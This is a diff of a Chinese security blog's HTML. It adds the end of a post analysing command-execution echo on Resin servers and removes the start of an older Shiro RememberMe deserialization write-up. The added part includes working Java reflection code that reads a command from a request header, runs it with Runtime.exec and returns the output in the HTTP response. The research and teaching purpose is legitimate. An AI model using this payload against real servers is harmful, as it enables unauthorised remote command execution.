+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192952083.png" alt="image-20210524192952083"></p>
+<p>​        测试代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193143325.png" alt="image-20210524193143325"></p>
+<p>​    获取到ServletRequest对象后，通过_response字段的内容获取到response对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193905979.png" alt="image-20210524193905979"></p>
+<p>​        获取Writer并执行写入操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">"test666"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        整体的代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">"test666"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525094741508.png" alt="image-20210525094741508"></p>
+<h2 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h2><p>​        在Resin 4.X中查看是否可以通过getContextRequest获取request对象，通过<code>TcpSocketLink.getCurrentRequest()</code>获取ProtocolConnection对象并返回，也就是说在Resin 4.X中也可以通过ServletInvocation的getContextRequest方法获取回显。通过ServletInvocation获取request对象是版本兼容的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525095734484.png" alt="image-20210525095734484"></p>
+<p>​        虽然在 Resin 3.x和4.x都获取了request对象，但实际上获取的request对象的实际类型是不同的。</p>
+<p><strong>Resin 3.x</strong></p>
+<p>​        在resin 3.x中获取的类型是HttpRequest对象，HttpRequest类中并没有保存_response对象，需要从父类AbstractHttpRequest中获取。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111526652.png" alt="image-20210525111526652"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111704916.png" alt="image-20210525111704916"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111926125.png" alt="image-20210525111926125"></p>
+<p>​        通过上面的分析在resin 3.x中获取response对象需要使用下面的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>).getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Resin 4.x</strong></p>
+<p>在Resin 4中获取的实际类型是HttpServletRequestImpl类型。HttpServletRequestImpl中直接保存了_response对象，所以可以用HttpServletRequestImpl的类加载器直接获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111156669.png" alt="image-20210525111156669"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111305609.png" alt="image-20210525111305609"></p>
+<p>​        在resin 4.x中使用下面的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>).getClass().getDeclaredField(<span class="string">"_response"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525112344783.png" alt="image-20210525112344783"></p>
+<p><strong>代码整合</strong></p>
+<p>​        通过上面的分析，可以通过判断获取的request对象的类型来判断resin的版本，再根据版本的不同选择不同微调代码进行回显利用。根据获取request对象的不同，通过不同的方式获取response对象。下面是从请求头获取命令执行并回显的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Field f;</span><br><span class="line">           Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">           Class&lt;?&gt; c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.http.HttpRequest"</span>);</span><br><span class="line">           <span class="keyword">if</span>(c.isInstance(currentRequest))&#123;</span><br><span class="line">               f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line"></span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               f = currentRequest.getClass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object response = f.get(currentRequest);</span><br><span class="line">            Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>);</span><br><span class="line">            Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">            Method getHeaderM = currentRequest.getClass().getMethod(<span class="string">"getHeader"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            String cmd = (String)getHeaderM.invoke(currentRequest, <span class="string">"sectest666"</span>);</span><br><span class="line">            Scanner s = (<span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">            w.write(s.hasNext() ? s.next() : <span class="string">""</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | IOException | IllegalAccessException | ClassNotFoundException | NoSuchFieldException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1894,393 +2273,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro rce漏洞分析</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-11-28 22:07:45" itemprop="dateCreated datePublished" datetime="2020-11-28T22:07:45+08:00">2020-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-24 10:04:49" itemprop="dateModified" datetime="2020-12-24T10:04:49+08:00">2020-12-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞分析</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在最近这几年，我们在渗透的过程中经常会用到shiro的rce漏洞来打点，直到目前为止还经常会在一些项目或者HW中也会经常遇到shrio的rce，因此了解shiro的RememberMe反序列化导致的命令执行漏洞的原理是至关重要的，在本次分享中，我将和大家一起学习shiro RememberMe反序列化漏洞。</span><br></pre></td></tr></table></figure>
-
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​    我这里选择网上已经有人搭建好的漏洞环境来搭建环境<code>https://github.com/potats0/ShiroDemo</code>，下载好项目以后使用IDEA导入pom.xml文件，由于我这里使用的MAVEN是阿里云镜像，我使用shiro-core为1.2.4时提示我找不到包，因此我这里使用的是1.2.2版本。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221450755.png" alt="image-20201128221450755"></p>
-<p>​    需要的包导入后，找到App.java文件，通过调试来运行。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221552395.png" alt="image-20201128221552395"></p>
-<p>​    运行成功后界面如下：</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221658967.png" alt="image-20201128221658967"></p>
-<h3 id="Shiro基本知识"><a href="#Shiro基本知识" class="headerlink" title="Shiro基本知识"></a>Shiro基本知识</h3><p>​    我们知道，shiro是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与Web集成、缓存等功能。</p>
-<p>​    下面我结合着这个漏洞环境的代码带大家一起学习一下shiro的基本知识。</p>
-<p>​    在这个项目的源码文件中，主要包含了4个文件，APP.java内容为启动springboot的内容，这里不做解释了，看下其他文件的内容，首先是MainRealm.java，在介绍这个文件的内容前，我们先了解几个基本的概念。</p>
-<p>​    我们知道，shiro框架的一个主要的功能是用来做身份认证的，在shiro中，主要通过principals （身份）和 credentials（证明）一起来验证用户的身份。</p>
-<h4 id="principals"><a href="#principals" class="headerlink" title="principals"></a><strong>principals</strong></h4><p>​    指用户身份的标识，可以是用户的用户名，手机号等等，但需要确保其唯一性。</p>
-<h4 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a><strong>credentials</strong></h4><p>​    凭证，一般来说就是密码。</p>
-<h4 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a><strong>Realm</strong></h4><p>​    域，shiro会从Realm中获取安全数据（用户，角色，权限），当SecurityManager要身份认证，需要从Realm中来确定用户身份以及用户可以访问的权限。</p>
-<p>​    在shiro中，SecurityManager负责身份认证的逻辑，它会委托给Authenticator进行身份认证，Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。</p>
-<p><strong>AuthorizingRealm</strong></p>
-<p>​    在shiro中，默认提供了一些Realm，他们的继承关系如下：</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="img"> </p>
-<p>​    CachingRealm是带缓存的Realm，里面包含了多个CacheManager属性，具体的缓存在其子类中进行实现。</p>
-<p>​    AuthenticatingRealm是带认证的Realm,该类实现了认证的基本逻辑和缓存逻辑。</p>
-<p>​    AuthorizingRealm主要用来鉴权和获取授权信息的Realm,该类实现了Authorizer，所以可以做鉴权。也实现了PermissionResolverAware，RolePermissionResolverAware因此可以对用户的访问权限做判断。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129131100239.png" alt="image-20201129131100239"></p>
-<p>​    在shiro认证过程中，依赖AuthenticatingRealm的getAuthenticationInfo方法，getAuthenticationInfo会调用我们自定义的doGetAuthenticationInfo方法获取认证的结果。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129132011123.png" alt="image-20201129132011123"></p>
-<p>​    在登录的时候需要将数据封装到<code>Shiro</code>的一个<code>token</code>中，执行shiro的<code>login()</code>方法，<code>Shiro</code>就会自动的调用<code>doGetAuthenticationInfo(AuthenticationToken token)</code>方法获取身份认证信息，在本次环境中，首先通过token.getPrincipal()方法获取username信息，通过authenticationToken.getCredentials()获取密码信息，对用户的用户名和密码进行判断，如果用户用户名为admin,密码为vulhub，认证成功则返回SimpleAuthenticationInfo对象,mainrealm.java的代码如下：</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129122749329.png" alt="image-20201129122749329"></p>
-<h4 id="shiro拦截器"><a href="#shiro拦截器" class="headerlink" title="shiro拦截器"></a><strong>shiro拦截器</strong></h4><p>​    在shiro中使用了与 Servlet 一样的 Filter 接口进行扩展，shiro拦截器的基础类及其继承关系如下：</p>
-<p><img src="https://wiki.jikexueyuan.com/project/shiro/images/14.png" alt="img"></p>
-<p>​    ShiroFilter是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，除了上面的基础拦截器类外，shiro还提供了一些比较常用的默认拦截器。</p>
-<p>​    FormAuthenticationFilter登录拦截器，它主要有两个作用，一个是拦截登录表单提交的路径，创建登录认证所需要的Token令牌，并进入登录认证流程。另一个作用是拦截要求登录后才可以访问的路径，如果已经登录则直接进入到要访问路径，如果未登录则访问被拒绝并跳转到登录页。登录拦截器常用的方法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createToken创建认证令牌，令牌内存储了登录认证时所需的数据。</span><br><span class="line">onLoginSuccess设置登录成功后的行为。</span><br><span class="line">onAccessDenied设置被拒绝后的行为</span><br><span class="line">setLoginUrl设置登录地址</span><br><span class="line">getUsername获取登录名，表单name值必须是username。</span><br><span class="line">getPassword获取密码，表单name值必须是password。</span><br></pre></td></tr></table></figure>
-
-<p>​    UserFilter用户拦截器，用户已经登录认证 或 已经记住我 的都可以通过。</p>
-<p>​    AnonymousFilter无需认证即可通过。</p>
-<h4 id="拦截器链"><a href="#拦截器链" class="headerlink" title="拦截器链"></a><strong>拦截器链</strong></h4><p>​    Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理。当Filter执行的过程中，首先执行shiro的拦截器链，再经过Servlet容器的拦截器链。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143520958.png" alt="image-20201129143520958"></p>
-<p>​    在shiro中提供了PathMatchingFilterChainResolver来判断请求的url和拦截器的规则是否匹配。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143926553.png" alt="image-20201129143926553"></p>
-<p>​    DefaultFilterChainManager中维护者一个拦截器链，我们可以通过DefaultFilterChainManager中的方法添加拦截器。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129144850395.png" alt="image-20201129144850395"></p>
-<h4 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a><strong>ShiroFilterFactoryBean</strong></h4><p>​    通过ShiroFilterFactoryBean类可以方便的配置拦截器的各种基本属性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setSecurityManager:注入一个SecurityManager类，SecurityManager负责管理整个shiro核心验证功能。</span><br><span class="line">setLoginUrl：配置登录页路径。</span><br><span class="line">setSuccessUrl：配置登录成功页路径。</span><br><span class="line">setUnauthorizedUrl：配置没有权限跳转的页面。</span><br><span class="line">setFilterChainDefinitionMap：设置拦截规则。拦截规则是通过一个Map进行导入的。</span><br><span class="line">setFilters：用于注入自己实现的拦截器类。</span><br></pre></td></tr></table></figure>
-
-<p>​    拦截规则是通过MAP来进行设置的，基本形式如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">filterChainDefinitionMap.put(&quot;&lt;拦截路径&gt;&quot;, &quot;&lt;拦截器名称&gt;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>​    拦截器路径是一个从根路径开始的url，并支持通配符。拦截器名称既可以是shiro内置拦截器的名称比如anon(无需认证的拦截器)、authc（需要认证的拦截器）、user (已经登录成功或使用记住我的拦截器)，perms[role_name] - 需要权限验证的路径使用perms拦截器。中括号内为权限名称列表。</p>
-<hr>
-<p>​    接下来我们看一下shiroConfig.java，这个类是shiro的配置类，在这个类的shiroFilterFactoryBean中，通过setSecurityManager来设置securityManager，在securityManager中，设置了Realm为我们自己定义的mainRealm，RememberMeManager为cookieRememberMeManager，也就是cookie的”记住我”功能。通过setLoginUrl方法来设置未登录时需要认证的地址也就是登录地址。setUnauthorizedUrl方法来设置无权访问时跳转的地址。通过创建LinkedHashMap，设置map.put(“/doLogin”, “anon”)来设置不需要登录就能访问的地址。通过map.put(“/xxx/**”, “user”);来设置用户登录后才能访问的地址。最后通过setFilterChainDefinitionMap将这个map设置到FilterChain中。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129134331085.png" alt="image-20201129134331085"></p>
-<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a><strong>Subject</strong></h4><p>​    Shiro中认证授权组件Subject，为我们提供了当前用户、角色和授权的相关信息，可以进行登录，退出，权限验证，获取用户信息，session。</p>
-<p>​    通过SecurityUtils.getSubject获取subject对象</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subject subject &#x3D; SecurityUtils.getSubject();</span><br></pre></td></tr></table></figure>
-
-<p>​    subject包含如下主要接口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Subject login(Subject subject, AuthenticationToken authenticationToken) throws AuthenticationException;    &#x2F;&#x2F;登陆</span><br><span class="line">void logout(Subject subject);        &#x2F;&#x2F;退出登陆</span><br><span class="line">Subject createSubject(SubjectContext context);    &#x2F;&#x2F;获取subject</span><br><span class="line">Session session &#x3D; subject.getSession(); &#x2F;&#x2F;获取session对象</span><br><span class="line">String currentUser &#x3D; subject.getPrincipal().toString(); &#x2F;&#x2F;获取登录名</span><br></pre></td></tr></table></figure>
-
-<p>​    了解了这些知识，我们看下UserController.java是如何实现的，通过SecurityUtils.getSubject方法获取subject对象，通过login来进行登录，传入的参数为UsernamePasswordToken对象。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129153131427.png" alt="image-20201129153131427"></p>
-<p>​    这里，shiro的基础知识我们大概了解了一些了，下面我们再看一下漏洞。</p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    因为之前已经有人分析过shiro的反序列化漏洞了，并且在文章中给出了存在反序列化漏洞的方法，在DefaultSerializer类的deserialize方法中，因此我们可以直接找到这个方法并打上断点 。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130114316497.png" alt="image-20201130114316497"></p>
-<p>​    在这个函数中调用了ObjectInputStream类的readObject方法来进行反序列化操作，下面是整个过程的调用栈</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">deserialize:75, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:526, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:367, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:860, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1591, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>
-
-<p>​    下面我们分析一下这个漏洞的调用过程，再调用的过程中，我们可以看到拦截器的调用链，已经将shiroFilter写入到tomcat拦截器之前。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130155604254.png" alt="image-20201130155604254"></p>
-<p>​    下面依次调用对应的拦截器，OrderedCharacterEncodingFilter–&gt;OrderedFormContentFilter–&gt;OrderedRequestContextFilter–&gt;ShiroFilterFactoryBean–&gt;WsFilter。</p>
-<p>​    首先调用OrderedCharacterEncodingFilter设置编码</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161156440.png" alt="image-20201130161156440"></p>
-<p>​    调用OrderedFormContentFilter获取参数，这里参数为空，因此会调用else中的代码。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161341690.png" alt="image-20201130161341690"></p>
-<p>​    调用OrderedRequestContextFilter完成requestContext的初始化操作。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130162453138.png" alt="image-20201130162453138"></p>
-<p>​    下来就是shiorFilter的调用链，再shior拦截器中调用了createSubject来创建subject对象。</p>
